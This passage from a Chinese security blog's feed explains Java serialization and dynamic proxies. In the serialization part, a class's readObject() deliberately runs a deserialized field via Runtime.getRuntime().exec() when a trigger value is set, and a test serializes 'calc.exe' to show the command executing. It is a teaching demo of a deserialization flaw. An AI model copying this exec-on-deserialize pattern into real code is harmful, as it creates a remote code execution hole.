class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行查看，确实是经过自己编写的writeObject()和readObject()两个方法来实现序列化和反序列化操作的：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/4.png" alt="自定义序列化demo"></p><p><strong>what’s more！——反序列化漏洞点</strong></p><p>Java反序列化漏洞点通常在于自定义实现的readObject()方法的代码逻辑存在缺陷，导致可能会触发反序列化漏洞。</p><p>其实这和PHP反序列化漏洞原理差不多，PHP中是魔法函数若存在缺陷代码则可能会存在反序列化漏洞风险，这类似于Java中自定义实现的readObject()函数。</p><p>下面的例子只在前面的例子中添加if语句中的Runtime.getRuntime().exec()：</p><p>User.class：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">public</span> String address;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> number;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream out)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Write Object."</span>);</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(name).reverse());</span><br><span class="line">        out.writeObject(<span class="keyword">new</span> StringBuffer(address).reverse());</span><br><span class="line">        out.writeInt(number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Read Object."</span>);</span><br><span class="line">        <span class="keyword">this</span>.name = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.address = ((StringBuffer)in.readObject()).reverse().toString();</span><br><span class="line">        <span class="keyword">this</span>.number = in.readInt();</span><br><span class="line">        <span class="comment">//加了个判断，当数字为666时，进入缺陷代码逻辑块</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">this</span>.number == <span class="number">666</span>)&#123;</span><br><span class="line">            Runtime.getRuntime().exec(name);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>test.class</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User();</span><br><span class="line">        <span class="comment">//将name字段值修改为calc命令</span></span><br><span class="line">        user.name = <span class="string">"calc.exe"</span>;</span><br><span class="line">        user.address = <span class="string">"England"</span>;</span><br><span class="line">        <span class="comment">//将number值设置为满足if判断条件的666值</span></span><br><span class="line">        user.number = <span class="number">666</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fos = <span class="keyword">new</span> FileOutputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectOutputStream obs = <span class="keyword">new</span> ObjectOutputStream(fos);</span><br><span class="line">            obs.writeObject(user);</span><br><span class="line">            obs.close();</span><br><span class="line">            fos.close();</span><br><span class="line">            System.out.println(<span class="string">"[*]User对象已经序列化保存到user.ser文件中"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unserialize_test</span><span class="params">()</span></span>&#123;</span><br><span class="line">        User user = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileInputStream fis = <span class="keyword">new</span> FileInputStream(<span class="string">"user.ser"</span>);</span><br><span class="line">            ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(fis);</span><br><span class="line">            user = (User)ois.readObject();</span><br><span class="line">            ois.close();</span><br><span class="line">            fis.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(<span class="string">"Name: "</span> + user.name + <span class="string">"\nAddress: "</span> + user.address + <span class="string">"\nNumber: "</span> + user.number);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        serialize_test();</span><br><span class="line">        unserialize_test();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行代码，查看到readObject()中的不安全代码块中执行了命令：</p><p><img src="/2019/02/03/Java序列化和反序列化机制/5.png" alt="自定义序列化demo"></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/dongguacai/p/5721056.html" target="_blank" rel="noopener">深入理解JAVA I/O系列五：对象序列化</a></p><p><a href="http://www.runoob.com/java/java-serialization.html" target="_blank" rel="noopener">Java 序列化</a></p><p><a href="https://www.cnblogs.com/duanxz/p/3511695.html" target="_blank" rel="noopener">java类中serialversionuid 作用 是什么?举个例子说明</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这里主要讲解Java序列化及反序列化机制。&lt;/p&gt;
&lt;h2 id=&quot;何为序列化&quot;&gt;&lt;a href=&quot;#何为序列化&quot; class=&quot;headerlink&quot; title=&quot;何为序列化&quot;&gt;&lt;/a&gt;何为序列化&lt;/h2&gt;&lt;p&gt;Java 提供了一种对象序列化的机制：一个对象可以被表示为
      
    
    </summary>
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/categories/Java/"/>
    
    
      <category term="Java" scheme="https://Mi1k7ea.github.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java动态代理机制</title>
    <link href="https://Mi1k7ea.github.com/2019/02/01/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/"/>
    <id>https://Mi1k7ea.github.com/2019/02/01/Java动态代理机制/</id>
    <published>2019-02-01T15:01:14.000Z</published>
    <updated>2019-02-08T14:23:10.231Z</updated>
    
    <content type="html"><![CDATA[<p>Java动态代理机制主要通过反射机制来实现的，下面讲解一下动态代理相关内容。</p><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p>代理模式是Java中常用的设计模式，主要由公共接口、被代理类和代理类等三部分组成，代理类持有被代理类的实类，代为执行具体的类方法。其中代理类与被代理类有同样的接口。</p><p>代理类与被代理类之间通常会存在关联关系，一个代理类的对象与一个被代理类的对象关联，代理类的对象本身并不真正实现服务，而是通过调用被代理类对象的方法来提供特定的服务。</p><p><strong>代理模式结构图</strong></p><p><img src="/2019/02/01/Java动态代理机制/1.png" alt="代理模式结构图"></p><p><strong>使用代理模式的场景</strong></p><p>(1)、设计模式中有一个设计原则是开闭原则，指修改关闭对扩展开放，当需要看非本人所写的代码时，通常很难直接修改代码，那么这时就可以通过代理对类进行增强。</p><p>(2)、在使用RPC框架时，框架本身并不能提前知道各个业务方要调用哪些接口的哪些方法 。那么这时就可通过动态代理的方式来建立一个中间人给客户端使用，也方便框架进行搭建逻辑，某种程度上也是客户端代码和框架松耦合的一种表现。</p><p>(3)、Spring的AOP机制就是采用动态代理的机制来实现切面编程。</p><p><strong>静态代理与动态代理</strong></p><p>根据加载被代理类的时机不同，将代理分为静态代理和动态代理。</p><p>如果在代码编译时就确定了被代理的类是哪一个，那么就可以直接使用静态代理；如果不能确定，那么可以使用类的动态加载机制，在代码运行期间加载被代理的类，这就是动态代理，比如RPC框架和Spring AOP机制。</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2><p>静态代理：在代码编译时就确定了具体的被代理类。由程序员创建或特定工具自动生成源代码，也就是在编译时就已经将接口、被代理类、代理类等确定下来。在程序运行之前，代理类的.class文件就已经生成。</p><p><strong>Demo示例</strong></p><p>其中被代理类已经明确的在代理类代码中写出，在代码编译时就能确定出该被代理类，从而实现静态代理：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">consumer</span><span class="params">(ProxyInterface pi)</span></span>&#123;</span><br><span class="line">        pi.echo();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        consumer(<span class="keyword">new</span> ProxyObject());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">ProxyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealObject</span> <span class="keyword">implements</span> <span class="title">ProxyInterface</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"This is RealObject."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ProxyObject</span> <span class="keyword">implements</span> <span class="title">ProxyInterface</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">echo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"AOP"</span>);</span><br><span class="line">        <span class="keyword">new</span> RealObject().echo();</span><br><span class="line">        System.out.println(<span class="string">"Write Log"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，代理类ProxyObject在执行被代理类RealObject的方法前后都能够方便地添加新的功能如Spring的面向切面编程AOP，且是通过调用被代理类的方法来实现调用的而非代理类自己直接调用的：</p><p><img src="/2019/02/01/Java动态代理机制/2.png" alt="静态代理"></p><h2 id="动态代理"><a href="#动态代理" class="headerlink" title="动态代理"></a>动态代理</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><p>在代码编译时未确定具体的被代理类，而在代码运行时动态加载被代理的类。在Java中java.lang.reflect包下提供了一个Proxy类和一个InvocationHandler接口，通过使用这个类和接口就可以生成动态代理对象。在程序运行过程中产生的这个对象，其实就是通过反射机制来生成的一个代理。</p><p>注意，JDK提供的代理只能针对接口做代理。</p><p>下面来看下实现动态代理机制的Proxy类和InvocationHandler接口。</p><h3 id="InvocationHandler接口"><a href="#InvocationHandler接口" class="headerlink" title="InvocationHandler接口"></a>InvocationHandler接口</h3><p>每一个动态代理类都必须要实现InvocationHandler这个接口，并且每个代理类的实例都关联到了一个handler，当代理类对象调用一个方法的时候，这个方法的调用就会被转发为由InvocationHandler这个接口的 invoke ()方法来进行调用。</p><p>作为InvocationHandler接口唯一的方法，invoke ()方法定义如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span></span><br></pre></td></tr></table></figure><p>proxy参数：指代被代理类对象即真实对象；</p><p>method参数：指代的是所要调用被代理类对象的某个方法的Method对象；</p><p>args参数：指代的是调用被代理类对象某个方法时接受的参数；</p><h3 id="Proxy类"><a href="#Proxy类" class="headerlink" title="Proxy类"></a>Proxy类</h3><p>Proxy这个类的作用就是用来动态创建一个代理对象类，它提供了许多的方法，其中用的最多的就是 newProxyInstance ()方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader, Class&lt;?&gt;[] interfaces,  InvocationHandler h)</span>  <span class="keyword">throws</span> IllegalArgumentException</span></span><br></pre></td></tr></table></figure><p>这个方法的作用就是得到一个动态的代理类对象，其中接收三个参数：</p><p>loader参数：一个ClassLoader对象，定义了由哪个ClassLoader对象来对生成的代理类对象进行加载；</p><p>interfaces参数：一个Interface接口对象数组，说明将要给被代理类对象提供一组什么样的接口，如果提供了一组接口给被代理类对象，那么该对象就宣称实现了该接口(多态)，这样就能调用这组接口中的方法了；</p><p>h参数：一个InvocationHandler对象，表示的是当这个动态代理对象在调用方法的时候，会关联到哪一个InvocationHandler对象上；</p><h3 id="创建动态代理对象的具体步骤"><a href="#创建动态代理对象的具体步骤" class="headerlink" title="创建动态代理对象的具体步骤"></a>创建动态代理对象的具体步骤</h3><p>1、创建一个InvocationHandler对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个与代理对象相关联的InvocationHandler</span></span><br><span class="line">InvocationHandler stuHandler = <span class="keyword">new</span> MyInvocationHandler&lt;Person&gt;(stu);</span><br></pre></td></tr></table></figure><p>2、使用Proxy类的getProxyClass静态方法生成一个动态代理类stuProxyClass </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; stuProxyClass = Proxy.getProxyClass(Person.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[] &#123;Person.class&#125;);</span><br></pre></td></tr></table></figure><p>3、获得stuProxyClass 中一个带InvocationHandler参数的构造器constructor</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor&lt;?&gt; constructor = PersonProxy.getConstructor(InvocationHandler.class);</span><br></pre></td></tr></table></figure><p>4、通过构造器constructor来创建一个动态实例stuProxy</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person stuProxy = (Person) cons.newInstance(stuHandler);</span><br></pre></td></tr></table></figure><p>当然，上面四个步骤可以通过Proxy类的newProxyInstances()方法来简化：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个与代理对象相关联的InvocationHandler</span></span><br><span class="line">InvocationHandler stuHandler = <span class="keyword">new</span> MyInvocationHandler&lt;Person&gt;(stu);</span><br><span class="line"><span class="comment">//创建一个代理对象stuProxy，代理对象的每个执行方法都会替换执行Invocation中的invoke方法</span></span><br><span class="line">Person stuProxy= (Person) Proxy.newProxyInstance(Person.class.getClassLoader(), <span class="keyword">new</span> Class&lt;?&gt;[]&#123;Person.class&#125;, stuHandler);</span><br></pre></td></tr></table></figure><h3 id="Demo示例"><a href="#Demo示例" class="headerlink" title="Demo示例"></a>Demo示例</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//创建一个被代理类的对象</span></span><br><span class="line">        Subject realSubject = <span class="keyword">new</span> RealSubject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过实现InvacationHandler接口，将被代理类对象传入handler</span></span><br><span class="line">        InvocationHandler handler = <span class="keyword">new</span> DynamicProxy(realSubject);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * 通过Proxy的newProxyInstance方法来创建代理类对象，来看看其三个参数</span></span><br><span class="line"><span class="comment">         * 第一个参数 handler.getClass().getClassLoader() ，我们这里使用handler这个类的ClassLoader对象来加载我们的代理对象</span></span><br><span class="line"><span class="comment">         * 第二个参数realSubject.getClass().getInterfaces()，我们这里为代理对象提供的接口是真实对象所实行的接口，表示我要代理的是该真实对象，这样我就能调用这组接口中的方法了</span></span><br><span class="line"><span class="comment">         * 第三个参数handler， 我们这里将这个代理对象关联到了上方的 InvocationHandler 这个对象上</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Subject subject = (Subject)Proxy.newProxyInstance(handler.getClass().getClassLoader(), realSubject.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(subject.getClass().getName());</span><br><span class="line">        subject.send();</span><br><span class="line">        subject.recv();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">interface</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RealSubject</span> <span class="keyword">implements</span> <span class="title">Subject</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">send</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Send"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">recv</span><span class="params">()</span></span>&#123;</span><br><span class="line">        System.out.println(<span class="string">"[*]Recv"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DynamicProxy</span> <span class="keyword">implements</span> <span class="title">InvocationHandler</span> </span>&#123;</span><br><span class="line">    <span class="comment">//要代理的被代理类对象</span></span><br><span class="line">    <span class="keyword">private</span> Object subject;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//构造方法，给被代理类对象赋初始值</span></span><br><span class="line">    DynamicProxy(Object subject)&#123;</span><br><span class="line">        <span class="keyword">this</span>.subject = subject;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object object, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable</span>&#123;</span><br><span class="line">        <span class="comment">//在代理真实对象前可以添加一些功能操作</span></span><br><span class="line">        System.out.println(<span class="string">"AOP"</span>);</span><br><span class="line">        System.out.println(<span class="string">"Method: "</span> + method);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//当代理类对象调用被代理类对象的方法时，其会自动跳转到代理类对象关联的handler对象的invoke()方法来进行调用</span></span><br><span class="line">        method.invoke(subject, args);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//在代理真实对象后也可以添加一些功能操作</span></span><br><span class="line">        System.out.println(<span class="string">"Write Logs"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次提醒，JDK提供的代理只能是针对接口做代理，也就是说调用newProxyInstance()返创建代理类对象时回的必须要是一个接口。</p><p>观察输出内容：</p><p><img src="/2019/02/01/Java动态代理机制/3.png" alt="动态代理"></p><p>第一行内容：”com.sun.proxy.\$Proxy0”是由 System.out.println(subject.getClass().getName()); 这条语句打印出来的，我们一般会以为返回的这个代理对象会是Subject类型的对象或者是InvocationHandler的对象，然并非，原因在newProxyInstance()方法的第二个参数上，该参数给代理类对象提供了一组接口，而该对象就会实现这组接口，这时可将这个对象强制类型转化为这组接口中的任意一个，因为这里的接口是Subject类型，所以就可以将其转化为Subject类型了。另外，通过 Proxy.newProxyInstance()创建的代理对象是在JVM运行时动态生成的一个对象，并非是InvocationHandler类型，也不是定义的那组接口的类型，而是在运行时动态生成的一个对象，并且命名方式都是以$开头、Proxy为中、最后为数字（表示对象的标号）的形式。</p><p>第二行至第五行内容（后面4行内容是类似的）：”AOP”和”Write Logs”为代理过程中新添加的输出功能；中间的”[*]Send”为代理类对象调用关联的handler中的invoke()方法来执行真实的被代理类的方法；”Method：”输出的是handler中invoke()方法method参数的值，这里可看到为”public abstract void Subject.send()”，说明该方法是来自真实的被代理类对象的接口方法，也就是说，并非是代理类对象直接调用目标方法，而是通过由其关联到的handler对象的invoke()方法中来调用，从而实现代理的方式调用。</p><p>同时因为在代码编译时并不知道被代理的类是哪个，因此实现了动态代理的方式。</p><h3 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h3><p>查看Proxy类的newProxyInstance()函数的实现代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@CallerSensitive</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">newProxyInstance</span><span class="params">(ClassLoader loader,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          Class&lt;?&gt;[] interfaces,</span></span></span><br><span class="line"><span class="function"><span class="params">                                          InvocationHandler h)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> IllegalArgumentException</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Objects.requireNonNull(h);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> Class&lt;?&gt;[] intfs = interfaces.clone();</span><br><span class="line">        <span class="keyword">final</span> SecurityManager sm = System.getSecurityManager();</span><br><span class="line">        <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">            checkProxyAccess(Reflection.getCallerClass(), loader, intfs);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Look up or generate the designated proxy class.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        Class&lt;?&gt; cl = getProxyClass0(loader, intfs);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * Invoke its constructor with the designated invocation handler.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (sm != <span class="keyword">null</span>) &#123;</span><br><span class="line">                checkNewProxyPermission(Reflection.getCallerClass(), cl);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">final</span> Constructor&lt;?&gt; cons = cl.getConstructor(constructorParams);</span><br><span class="line">            <span class="keyword">final</span> InvocationHandler ih = h;</span><br><span class="line">            <span class="keyword">if</span> (!Modifier.isPublic(cl.getModifiers())) &#123;</span><br><span class="line">                AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;</span><br><span class="line">                    <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        cons.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> cons.newInstance(<span class="keyword">new</span> Object[]&#123;h&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException|InstantiationException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span 